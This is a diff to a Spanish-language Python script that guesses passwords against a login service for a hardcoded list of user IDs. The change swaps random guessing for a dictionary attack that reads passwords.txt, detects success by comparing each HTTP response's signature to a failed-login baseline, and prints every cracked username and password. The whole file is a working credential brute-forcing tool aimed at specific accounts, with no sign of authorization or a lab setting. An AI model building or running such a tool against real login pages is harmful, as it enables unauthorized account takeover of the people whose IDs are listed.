@@ -1,6 +1,4 @@
 import sys
-import string
-import random
 
 import requests
 
@@ -12,9 +10,7 @@ USUARIOS = [
     "51066056",
 ]
 
-CHARSET = string.digits + string.ascii_letters + string.punctuation
-LARGO_MIN = 1
-LARGO_MAX = 9
+WORDLIST = "passwords.txt"
 
 
 def respuesta(usuario, password):
@@ -38,26 +34,44 @@ def baseline(usuario):
     return firma(r)
 
 
-def buscar_random(usuario, base):
-    intentos = 0
-    while True:
-        largo = random.randint(LARGO_MIN, LARGO_MAX)
-        pw = "".join(random.choices(CHARSET, k=largo))
-        intentos += 1
+def cargar_passwords():
+    with open(WORDLIST, encoding="latin-1") as f:
+        return [linea.strip() for linea in f if linea.strip()]
+
+
+def buscar(usuario, passwords, base):
+    total = len(passwords)
+    for i, pw in enumerate(passwords, 1):
         r = respuesta(usuario, pw)
-        print(f"  intento {intentos:>8}: {pw!r}")
+        print(f"  [{i}/{total}] probando: {pw!r}")
         if firma(r) != base:
-            return pw, intentos
+            return pw, i
+    return None, total
 
 
 def main():
+    passwords = cargar_passwords()
+    print(f"[cliente] cargadas {len(passwords)} contrasenas de '{WORDLIST}'\n")
+
+    encontrados = {}
     for usuario in USUARIOS:
         print(f"[cliente] usuario {usuario}")
         base = baseline(usuario)
         print(f"[cliente] huella de login INCORRECTO: {base}")
-        print(f"[cliente] empezando a probar al azar...\n")
-        pw, intentos = buscar_random(usuario, base)
-        print(f"\n[cliente] >>> ADIVINADA en {intentos} intentos  ->  usuario: {usuario}   contrasena: {pw}")
+        pw, intentos = buscar(usuario, passwords, base)
+        if pw is not None:
+            print(f"\n   >>> ADIVINADA en {intentos} intentos  ->  usuario: {usuario}   contrasena: {pw}\n")
+            encontrados[usuario] = pw
+        else:
+            print(f"\n   ...no estaba en la lista para {usuario}\n")
+
+    print("==================== RESULTADO ====================")
+    if encontrados:
+        for usuario, pw in encontrados.items():
+            print(f"  usuario: {usuario}   contrasena: {pw}")
+    else:
+        print("  no se adivino ninguna contrasena")
+    print("==================================================")
 
 
 if __name__ == "__main__":
